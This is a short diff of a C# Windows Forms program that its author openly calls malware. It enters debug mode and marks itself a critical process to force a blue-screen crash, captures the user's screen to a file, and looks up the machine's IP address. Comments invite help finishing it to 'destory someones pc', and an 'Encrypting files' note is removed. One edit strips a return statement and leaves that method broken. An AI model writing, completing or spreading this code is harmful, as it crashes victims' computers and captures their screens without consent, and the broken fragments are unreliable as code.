@@ -34,7 +34,7 @@ namespace WindowsFormsApp1
             InitializeComponent();
         }
 
-        private string Form1_Load(object sender, EventArgs e)
+        private void Form1_Load(object sender, EventArgs e)
         {
             Process.EnterDebugMode(); // gets debug options to iniate a blue screen o' death and delete all your things!
             int isCritical = 1;  // we want this to be a Critical Process
@@ -157,7 +157,7 @@ namespace WindowsFormsApp1
             {
                 if (ip.AddressFamily == AddressFamily.InterNetwork)
                 {
-                    return ip.ToString();
+                    ip.ToString();
                 }
             }
             throw new Exception("no");
@@ -167,8 +167,6 @@ namespace WindowsFormsApp1
             Graphics captureGraphics = Graphics.FromImage(captureBitmap);
             captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
             captureBitmap.Save(@"Capture.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
-           // host.HostName;
-            // Encrypting files.
             // Any help on this malware is apreciated.
             // However i advise not downloading this and using it on your own PC.
             // If you do download it and you wanna destory someones pc:
